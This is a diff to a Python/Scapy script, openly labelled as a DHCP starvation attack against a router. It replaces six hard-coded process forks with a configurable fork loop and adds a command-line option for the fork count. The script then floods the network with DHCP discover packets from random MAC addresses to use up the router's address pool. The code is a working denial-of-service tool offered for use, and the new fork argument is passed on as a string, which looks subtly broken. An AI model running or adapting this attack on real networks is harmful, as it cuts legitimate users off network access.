@@ -18,13 +18,10 @@ class Starve:
         self.__GATEWAY_IP = conf.route.route("0.0.0.0")[2]
 
     # DoS to router -- DHCP starvation attack
-    def starvationAttack(self, delay, iteration):
-        os.fork()
-        os.fork()
-        os.fork()
-        os.fork()
-        os.fork()
-        os.fork()
+    def starvationAttack(self, delay, iteration, forks):
+        for i in range(forks):
+            os.fork()
+
         for i in range(iteration):
             request = self.generatePacketClient("discover", RandMAC())
             sendp(request)
@@ -45,9 +42,10 @@ class Starve:
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="This script is a DHCP starvation attack.")
     parser.add_argument("-s", "--secondDelay", required=False, help="Seconds to delay the function")
-    parser.add_argument("-i", "--iteration", required=False, help="Number of fakes device to connect. "
-                                                                  "(The real number is 64 * i)")
+    parser.add_argument("-i", "--iteration", required=False, help="Number of fakes device to connect (without counting threads)")
+    parser.add_argument("-f", "--forks", required=False, help="Number of forks. Remember that forks=2^N (default 4=2^4=16)")
     args = parser.parse_args()
+    
     print("Starve...")
 
     if args.secondDelay is None:
@@ -58,7 +56,12 @@ if __name__ == "__main__":
         iteration = 100
     else:
         iteration = args.iteration
+    if args.forks is None:
+        forks = 4
+    else:
+        forks = args.forks
 
     s = Starve()
-    s.starvationAttack(seconds, int(iteration))
+    s.starvationAttack(seconds, int(iteration), forks)
+
 
